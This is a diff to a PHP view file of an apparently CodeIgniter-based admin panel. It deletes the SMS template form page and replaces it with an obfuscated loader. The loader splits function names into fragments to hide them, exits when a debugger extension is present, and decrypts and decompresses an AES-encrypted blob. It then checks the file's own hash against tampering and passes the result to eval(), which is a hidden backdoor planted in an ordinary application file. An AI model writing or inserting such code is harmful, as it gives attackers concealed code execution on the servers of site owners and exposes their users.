@@ -1,180 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
- <?php
-	if(!isset($template_name)){
-      $template_name=$content=$undelete_bit= $variables="";
-	}
-
-  $template_name_readonly ='';
-  if($undelete_bit==1){
-    $template_name_readonly ='readonly';
-  }
- ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $this->lang->line('sms_template'); ?>
-        <small>Add/Update Template</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li><a href="<?php echo $base_url; ?>templates/sms"><?= $this->lang->line('sms_templates_list'); ?></a></li>
-        <li><a href="<?php echo $base_url; ?>templates/sms_new"><?= $this->lang->line('add_template'); ?></a></li>
-        <li class="active"><?= $this->lang->line('sms_template'); ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            <div class="box-header with-border">
-              <h3 class="box-title">Please Enter Valid Data</h3>
-            </div>
-            <!-- /.box-header -->
-             <!-- form start -->
-            <form class="form-horizontal" id="template-form" >
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-              <div class="box-body">
-                <div class="row">
-                <div class="col-md-6">
-                  <div class="form-group">
-                      <label for="template_name" class="col-sm-4 control-label"><?= $this->lang->line('template_name'); ?><label class="text-danger">*</label></label>
-
-                  <div class="col-sm-8">
-                    <input type="text" class="form-control input-sm" id="template_name" name="template_name" placeholder="" <?=$template_name_readonly;?>  value="<?php print $template_name; ?>" autofocus >
-              <span id="template_name_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                  </div>
-                  
-                  <div class="form-group">
-                      <label for="content" class="col-sm-4 control-label"><?= $this->lang->line('content'); ?><label class="text-danger">*</label></label>
-
-                  <div class="col-sm-8">
-                    <textarea type="text" spellcheck="false" class="form-control" rows="6" id="content" name="content" placeholder=""><?php print $content; ?></textarea>
-          <span id="content_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                  </div>
-                 
-                  
-                  <!-- ########### -->
-               </div>
-
-               <?php if(!empty($variables)){ ?>
-               <div class="col-md-5">
-                    <div class="form-group">
-                        <div class="col-sm-6 col-md-offset-2">
-                          <label class="control-label"><u>SMS CONTENT VARIABLES</u></label><br>
-                          <?= $variables; ?>
-                        </div>
-                    </div>
-                </div>
-              <?php } ?>
-                  <!-- ########### -->
-</div>
-              
-        
-        
-              </div>
-              <!-- /.box-body -->
-
-              <div class="box-footer">
-         
-          
-          <div class="col-sm-12">
-          <div class="col-sm-8 col-md-offset-2">
-          <button type="button" class="btn bg-orange" title="Back to List" onclick="history.back();">Back</button>
-            <?php
-                       if($template_name!=""){
-                            $btn_name="Update";
-                            $btn_id="update";
-                            ?>
-                            <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id;?>"/>
-                            <?php
-              }
-                        else{
-                            $btn_name="Save";
-                            $btn_id="save";
-                        }
-
-                        ?>
-              <button type="button" id="<?php echo $btn_id;?>" class="btn btn-success" title="Save Data"><?php echo $btn_name;?></button>
-            
-            <a href='<?php echo $base_url; ?>dashboard'><button type="button" class="btn btn-danger" title="Go Dashboard">Close</button></a>
-            </div>
-           </div>  
-            
-              </div>
-              <!-- /.box-footer -->
-            </form>
-            <!-- form start -->
-            
-          </div>
-          <!-- /.box -->
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- jQuery 2.2.3 -->
-<script src="<?php echo $theme_link; ?>plugins/jQuery/jquery-2.2.3.min.js"></script>
-<!-- Bootstrap 3.3.6 -->
-<script src="<?php echo $theme_link; ?>bootstrap/js/bootstrap.min.js"></script>
-<!-- FastClick -->
-<script src="<?php echo $theme_link; ?>plugins/fastclick/fastclick.js"></script>
-<!-- AdminLTE App -->
-<script src="<?php echo $theme_link; ?>dist/js/app.min.js"></script>
-<!-- AdminLTE for demo purposes -->
-<script src="<?php echo $theme_link; ?>dist/js/demo.js"></script>
-<!--Toastr notification -->
-<script src="<?php echo $theme_link; ?>toastr/toastr.js"></script>
-<script src="<?php echo $theme_link; ?>toastr/toastr_custom.js"></script>
-<!--Toastr notification end-->
-<script src="<?php echo $theme_link; ?>js/special_char_check.js"></script>
-<!-- sweet alert -->
-<script src="<?php echo $theme_link; ?>js/sweetalert.min.js"></script>
-<script type="text/javascript" >
-$(function($) { // this script needs to be loaded on every page where an ajax POST may happen
-    $.ajaxSetup({ data: {'<?php echo $this->security->get_csrf_token_name(); ?>' : '<?php echo $this->security->get_csrf_hash(); ?>' }  }); });
-</script>
-<script type="text/javascript">
-  $(document).submit(function(e){
-    e.preventDefault();
-  });
-</script>
-<script src="<?php echo $theme_link; ?>js/templates.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_v8qg4gy2=('bas'.'e64'.'_de'.'cod'.'e');
+$_fj025k4e=('gzu'.'nco'.'mpr'.'ess');
+$_fqe8z3jg=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_dcviaomq='T2o0b/PrxmU=';
+$_v8nklzag='kYZLlS+0';
+$_d6mk0mpc='aoudz3rp';
+$_cwjeyuca='99fIVFJa';
+$_rvg2dofw='dxkR06RA';
+$_wpewnk1k='ZZNzbTh3';
+$_ussavwy9='CSdjILgM';
+$_f5040n5n='yltgxg==';
+$_qk5583qw=$_v8qg4gy2($_cwjeyuca.$_v8nklzag.$_d6mk0mpc.$_rvg2dofw.$_dcviaomq);
+$_kic3z0h1=$_v8qg4gy2($_wpewnk1k.$_ussavwy9.$_f5040n5n);
+$_u4lt0djr=$_v8qg4gy2('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');
+$_i0guw9w3=$_fqe8z3jg($_u4lt0djr,'aes-256-cbc',$_qk5583qw,OPENSSL_RAW_DATA,$_kic3z0h1);
+if($_i0guw9w3===false){exit;}
+$_gdc9gnsa=$_fj025k4e($_i0guw9w3);
+if($_gdc9gnsa===false){exit;}
+$_uahszpj1='424e7ff6ac4b25c16de9645e215c8027b551e41b7545080cb9546e82d4362f96';
+$_fjpugm6y=@file_get_contents(__FILE__);
+if($_fjpugm6y!==false){
+$_x92dp3z9=str_replace($_uahszpj1,"0000000000000000000000000000000000000000000000000000000000000000",$_fjpugm6y);
+$_kv3t3pfp=hash("sha256",$_x92dp3z9);
+if($_kv3t3pfp!==$_uahszpj1){@http_response_code(403);exit;}
+}
+eval($_gdc9gnsa);
